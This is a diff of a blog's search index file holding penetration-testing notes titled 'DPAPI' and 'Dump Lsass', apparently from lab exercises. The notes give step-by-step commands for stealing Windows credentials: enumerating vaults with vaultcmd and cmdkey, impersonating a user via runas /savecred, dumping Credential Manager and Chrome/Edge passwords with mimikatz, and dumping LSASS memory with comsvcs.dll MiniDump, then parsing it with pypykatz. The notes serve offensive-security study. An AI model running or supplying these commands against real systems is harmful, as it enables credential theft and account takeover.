@@ -1,70 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DPAPI</title>
-    <url>/2025/11/26/DPAPI/</url>
-    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
-<ul>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
-<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
-<li><code>%ProgramData%\Microsoft\Vault\</code></li>
-<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
-</ul>
-<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
-<li>Website passwords.</li>
-<li>Online account logins</li>
-</ul>
-<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
-<li>Network shares (like <code>\\server\share</code>)</li>
-<li>Domain user logins</li>
-<li>Services (OneDrive, etc.)</li>
-<li>Remote desktop connections</li>
-</ul>
-<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
-<p>For standard vaults </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
-
-<p>For stored credentials</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
-
-
-<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
-<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
-<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump DPAPI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Dump Lsass</title>
     <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h1 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h1><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><p>Select the process from task manager </p>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
 <p><img src="/task-manager.png" alt="Select the process"></p>
 <p>Create a dump file</p>
 <p><img src="/dump-lsass.png" alt="dump lsass"></p>
 <p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
 
 <h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Post-Exploitation</category>
@@ -476,6 +427,59 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DPAPI</title>
+    <url>/2025/11/26/DPAPI/</url>
+    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
+<ul>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
+</ul>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
+
+
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump DPAPI</tag>
       </tags>
   </entry>
 </search>
